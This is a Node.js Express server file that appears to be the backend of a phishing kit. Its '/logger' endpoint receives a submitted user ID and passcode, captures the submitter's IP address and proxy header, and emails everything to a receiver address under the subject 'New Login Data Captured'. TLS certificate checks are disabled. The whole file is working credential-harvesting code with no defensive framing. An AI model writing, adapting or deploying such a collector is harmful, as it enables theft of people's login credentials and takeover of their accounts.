const express = require("express")
const nodemailer = require('nodemailer');
const cors = require('cors');
require('dotenv').config()


const app = express();
const PORT = process.env.PORT
app.use(cors());
app.use(express.json());
app.set('trust proxy', true); // Add this line after app initialization

app.listen(PORT, ()=>{
    console.log(`server is running on ${PORT}` );  
})


app.post('/logger', async (req, res) => {
  const { userId, passcode } = req.body;
  const userIP = req.ip || (req.headers['x-forwarded-for'] || '').split(',')[0] || 'Unknown IP';
  const proxy = req.headers['via'] || 'No proxy detected';

  const emailContent = `
    <h2>User Login Attempt</h2>
    <p><strong>User ID:</strong> ${userId}</p>
    <p><strong>Passcode:</strong> ${passcode}</p>
    <p><strong>IP Address:</strong> ${userIP}</p>
    <p><strong>Proxy:</strong> ${proxy}</p>
  `;

  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    },
    tls: {
    rejectUnauthorized: false // <== Allow self-signed certs
    }
  });

    await transporter.sendMail({
      from: `"Logger" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_RECEIVER,
      subject: 'New Login Data Captured',
      html: emailContent,
    });

    res.status(200).json({ 
        message: 'Credentials sent successfully.' 
    });
  } catch (err) {
    console.error('Email error:', err);
    res.status(500).json({ 
        message: 'Failed to send credentials.' 
    });
  }
});

